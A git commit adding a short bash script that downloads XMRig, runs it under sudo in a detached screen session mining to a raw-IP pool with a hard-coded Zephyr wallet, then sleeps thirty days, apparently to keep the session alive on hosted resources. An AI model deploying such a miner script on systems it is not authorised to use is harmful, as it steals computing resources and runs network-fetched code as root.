d4244d1f037f29d5048de385c9204e5084ff9012
bibirbusin <132418678+bibirbusin@users.noreply.github.com>
2023-12-08 13:34:24 +0700

    Create aluxy24cp.sh

---
+++ zephyr/aluxy24cp.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+curl https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz -L -O -J
+tar -xf xmrig-6.20.0-linux-x64.tar.gz
+cd ./xmrig-6.20.0
+sleep 5
+screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o 47.89.234.100:2222 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p x --tls --threads=24 -k --randomx-1gb-pages
+screen -ls
+sleep 2592000
